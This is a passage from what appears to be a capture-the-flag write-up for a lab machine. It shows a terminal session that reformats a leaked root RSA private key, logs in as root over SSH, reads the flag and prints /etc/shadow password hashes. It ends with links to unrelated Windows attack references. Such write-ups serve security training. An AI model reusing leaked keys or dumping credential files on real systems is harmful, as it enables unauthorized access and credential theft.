W+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU\n6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC\/cQbPm\nQeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G\n-----END RSA PRIVATE KEY-----\n

➜  health awk '{gsub(/\\n/,"\n")}1' unformated-id_rsa >> still-bad-format
➜  health awk '{gsub(/\\/,"")}1' still-bad-format > root-id_rsa
➜  health cat root-id_rsa 
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9/jG5NPqc2TfW4Nlj9gE
KScDJTrF0vXYnIy4yUwM4/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq
IMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH/
KuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL/XP1hN4B7egzjcV8Rphj6XRE3bhgH
7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8
W6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae
NPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9
t3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8/v/3Jeesznu+RJ+G0ezyUGfi0wpQRoD
C2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl
hnqFXpOWB771WnW9yH7/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x/LUyan++D+8
efiWCNS3yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB2
1bLlZQECgYEA9iT13rdKQ/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj
nVhtw6NRFZ1Gfu21kPTCUTK34iX/p/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn3
sqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou
fEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q
0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ
zkbVWX3JRDh4vdFOBGB/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT
rti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcB
N1ZI4E59+O3Z15VgZ/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD
SsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o
++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp
UnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR/xkIP/Mog1a
vmChAoGBAKcW+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU
6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC/cQbPm
QeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G
-----END RSA PRIVATE KEY-----

➜  health chmod 400 root-id_rsa
➜  health ssh root@health.htb -i root-id_rsa

root@health:~# id && cat root.txt
uid=0(root) gid=0(root) groups=0(root)
b83ed10d472998b7cebf294c7a62719e

root@health:~# cat /etc/shadow
root:$6$CGK4O3ut$hQTwfTrsIVAL2.wTf.mNzkpipITwSLVjqTw5bN2bnXXQi8QU4lnrlnrBMZ87bzMMQEyuxnlLJIMGhKIFjZBFn/:19130:0:99999:7:::
susanne:$6$1e4aezQ4$SdT0K.JpwHFrulyYF6iHx.KItM.AjoMmpyUrk.JSb/hit4YHeAJvrjKVZDEx8M9Hts5UE1FgJY.SC1ia3AvBt.:19129:0:99999:7:::
gogs:$6$PwVrNTkQ$L5f1d4EbQ8d3BtOBhR8fijKDs6Px3x1bFbLHgIauWbdY0IWfYNLacYF0rVWlr6PmnyVza3JsBZunFlE6MF.uB0:19129:0:99999:7:::
```


-----------------------------
## References
- <https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials>
- <https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/>
- <https://labs.nettitude.com/blog/introducing-sharpwsus/>
- <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#wsus-deployment>

